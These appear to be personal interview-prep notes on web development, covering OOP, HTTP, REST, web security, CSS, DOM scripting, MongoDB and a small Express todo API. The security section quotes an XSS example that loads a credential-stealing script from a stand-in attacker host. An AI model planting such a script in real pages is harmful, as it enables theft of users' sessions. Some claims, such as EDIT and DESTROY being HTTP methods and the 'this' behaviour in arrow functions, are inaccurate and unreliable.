========================
= 1. GENERAL QUESTIONS =
========================


1. What is Polymorphism?

Ability of a function to handle objects of many types. i.e. shape.draw() vs drawCircle() / drawRectange() etc.


2. What is Encapsulation?

Packing of data and functions into a single component. Data hiding. Protect anything which is prone to change.


3. What is Inversion of Control?

A design in which custom-written parts of a program receive the flow of control from a library.


4. What is Tail Recursion?

return x + recsum(x - 1) is considered regular recursion. return recsum(x - 1, running_total + x) is considered tail recursion because with each evaluation of the recursive call, the running_total is updated.


5. What is HTTP?

Hypertext transfer protocol is a communications protocol used to send and receive webpages and files across the internet.


6. What is HTTPS?

HTTPS is a secured version of HTTP. It encrypts data sent and received.


7. What is object-orientated programming?

OOP is programming focused on objects rather than actions, and data rather than logic. We care more about the objects we want to manipulate rather than the logic required to manipulate them. Objects are things like Humans (Eat, Sleep, Drink, etc), Building (Floors, structure type, etc).


8. What is REST?

Representational state transfer. Implementation intended to increase efficiency in communication. Example of non-RESTful system is having an entire home movie collection. A RESTful counterpart would be just streaming the movie you need at whatever time. Proper implementation of GET, POST, PUT, DELETE, EDIT, UPDATE, DESTROY is part of being RESTful.


9. What is an Idempotent operation?

PUT and DELETE are idempotent meaning the operation will produce the same result no matter how many times its repeated.


10. What is a Nullipotent operation?

GET method is nullipotent meaning its safe - calling it produces no side effects.


11. What are some web security vulnerabilities?

XSS - Cross site scripting -> injecting client side scripts into web pages viewed by others. Example is The attacker adds the following comment: Great price for a great item! Read my review here <script src="http://hackersite.com/authstealer.js"> </script>.

CSRF - Cross site request forgery -> unauthorized commands transmitted from a user that the website trusts. Examples include an attacker adding items to someone else's cart, changing addresses, or changing login details.

Session fixation - Hijack a user session

SQL Injection - inputting SQL to fields to drop tables and stuff


13. What is AJAX?

Asynchronous Javascript and XML. Sends data to and from a server asynchronously (in the background) without interfering with the display and behaviour of the existing page. Allows content to be changed dynamically without needing to reload the page.


14. What is JSON?

Javascript Object Notation. Easy to read and write data stored like objects


15. What is JSONP?

JSON with Padding. Bypasses the cross-domain policies in web-browsers (cannot make AJAX requests to a webpage percieved to be on a different server by the browser). JSONP not dispatched by XMLHTTPRequest, instead creates a <script> tag, whose sources is the target URL, and then added to the DOM. Difference in response is JSONP is passed as an argument to a callback.


16. What is CORS?

Cross-origin resource sharing -> allows restricted resources such as fonts on a web page to be requested from another domain outside the domain from which the first resource was served.
  Example:
  Imagine alice.com has some data that bob.com wants to access. This type of request traditionally wouldnt be allowed under the browsers same origin policy. However, with CORS requests, alice.com can add a few special response headers that allow bob.com to access it.


17. What is a Websocket?

Persistent connection between a web browser and a server. A client or server can send back a message at any time. Is it stateful (not stateless like traditional http). A single server is aware of all of its connections, allowing you to communicate with any number of open connections. (i.e. chat client)


18. Cookies - Sessions vs Persistent

Cookies are strings of data a server sends to the browser. When a browser requests an object from the some domain in the future, the browser will send the same string of data back to the origin server.

Session cookie - no expiration date. Stored in memory and not written to disk. When the browser is closed, the session is lost

Persistent cookie - has an expiration date. On the date, it will be removed from the disk


19. Storage sessionStorage vs localStorage

Both are storage in the browser. sessionStorage is a session, it gets cleared when browser is closed, and localStorage is persistent


20. Authentication using cookies, JWT

Cookie based auth is stateful. That means a record or ession must be kept on both server and client. The server needs to keep track of active cookies in a database, while the client created a session identifier.

Token based auth is stateless. The server does not keep a record. Every request to the server is accompanied by a token which the server verifies.


==============
= Javascript =
==============


1. What is the "this" keyword?

In most languages, ‘this’ is a reference to the current object instantiated by the class. In JavaScript, ‘this’ normally refers to the object which ‘owns’ the method, but it depends on how a function is called. 




========
= HTML =
========

- block elements go on their own line. <p> is an example
- inline elements stay in the same line. the following two are examples:
- <b> is bold, but you should use <strong>
- <i> is italics, but you should use <em>
- divs are block elements
- spans are inline

<table>
  <thead> -> this is a tag for semantics, just to make things look sensible
    <tr>
      <th>Name</th>
      <th>Age</th>
    </tr>
  </thead>
  <tbody> -> this is a tag for semantics, just to make things look sensible
    <tr>
      <td>Rusty</td>
      <td>2</td>
    </tr>
    <tr>
      <td>Wiley</td>
      <td>8</td>
    </tr>
  </tbody>
</table>


<form action="http://wikipedia.com" method="GET">
sends a GET request to wikipedia. usually we want to send it to our own server

sends request as wikipedia.com?username=hello&my_password=fdskjl for name tags

radio button - select from a list, need to give name attribute to be able to select only one item. radios need value tag otherwise itll just say "pet_choice=on" in the URL

checkbox - select multiple



=======
= CSS =
=======


- background-size: cover stretches it out across the entire background

selectors:
-----------

Element: li {

Class: .someClass {

Id: #someID {

Select everything: * {

Descendent tag - anchor tags inside of an li:   li a {

Adjacent tag - ul next to an h4:    h4 + ul {

Attribute tag - every anchor tag with an attribute:   a[href="google.com"] {

nth of type - every third ul:  ul:nth-of-type(3) {   
it also selects every third of a group


Inheritance
-----------

ul {
  color: purple
}

makes the li's inside of them purple as well


Fonts
-----

if you have 

h1 {
  font-size: 15px;
}

and a span inside it, if you does

span {
  font-size: 2em;
}

font-size will be twice as much as it's parent, so 30px;


Float
-----

No space between things use:
float: left; (gets rid of white space that browser adds)


Position
--------

- position:static -> is the default position and refers to where it normally would be in the document

- position:relative -> if you specify relative, then you can move the item top, bottom, left, right relative to where it would normally be

- position:absolute -> will remove the item from where it should be and you can place it exactly where you want it with top, right, left, bottom etc. but it will start from (0, 0)

- position:relative + position:absolute -> If we set relative positioning on div-1, any elements within div-1 will be positioned relative to div-1. Then if we set absolute positioning on div-1a, we can move it to the top right of div-1:

- two column absolute:
#div-1 {
 position:relative;
}
#div-1a {
 position:absolute;
 top:0;
 right:0;
 width:200px;
}
#div-1b {
 position:absolute;
 top:0;
 left:0;
 width:200px;
}

- that might look bad if the columns are of different heights. have to use floats.

- float:left will make the second column wrap around the first

- if we float:left both, they will push up against each other side by side

- we can use clear:both to keep them side by side, and the next section will start on a new line properly

====================
= DOM Manipulation =
====================

var h1 = document.querySelector('h1');
h1.style.color = 'red';

Get all li's:
querySelectorAll('li');

- getElementById()

h1.style.border = "10px solid red";
h1.style.fontSize = "70px";
h1.style.marginTop = "200px";

// Add a class to an h1
h1.classList.add('my-class');

// Remove a class
h1.classList.remove('my-class');

// Toggle a class
h1.classList.toggle('my-class');

// Alter the text
h1.textContent = "blah blah blah";

// Inner HTML
h1.innerHTML = "blah <strong>blah</strong> blah";

// Getting attribute
myA.getAttribute("href");

// Manipulating attributes
img.setAttribute("src", "corgi.png");


DOM Events
----------

var button = document.querySelector("button");

button.addEventListener("click", () => {
  console.log("Someone clicked the button");
});

for (var i = 0; i < lis.length; i++) {
  lis[i].addEventListener("click", () => {
    this.style.color = "purple";    // can use this to refer to lis[i] 
  });
}

show dbs
show collections

use demo

// Insert data into a collection
db.dogs.insert({ name: "Rusty", breed: "Mutt" })

// Find all
db.dogs.find({})

// Find a particular instance
db.dogs.find({ name: "Rusty" })

// Update a value
db.dogs.update({name: "Lulu"}, {breed: "Labrador"})
// Problem with this is it completely overwrites the left object with the right object

// If you only want to update the breed while preserving the original name:
db.dogs.update({name: "Lulu"}, {$set: {breed: "Labrador"}})

// To remove a group of items
db.dogs.remove({breed: "Labrador"})

// Remove a number of items
db.dogs.remove({breed: "Labrador"}).limit(2)



EXAMPLE APP
===========

const express = require('express')
  , bodyparser = require('body-parser')
  , MongoClient = require('mongodb').MongoClient
  , app = express()

app.use(bodyparser.json({ type: '*/*' }));

let db

MongoClient.connect('mongodb://localhost:27017/interview', (err, database) => {
  if (err) return console.log('There was an error starting the database.', err)
  db = database
  app.listen(3001, process.env.IP, () => {
    console.log("The API server is listening on port 3001.")
  })
})

app.get('/get_todos', (req, res) => {
  db.collection('todos').find().toArray((err, result) => {
    if (err) return console.log('Error with /get_todos', err)
    console.log('result', result)
    res.send(result)
  })
})

app.post('/add_todo', (req, res) => {
  db.collection('todos').save(req.body, (err, result) => {
    if (err) return console.log('Error with /add_todo', err)
    res.send({ success: 'you have added it to the database' })
  })
})
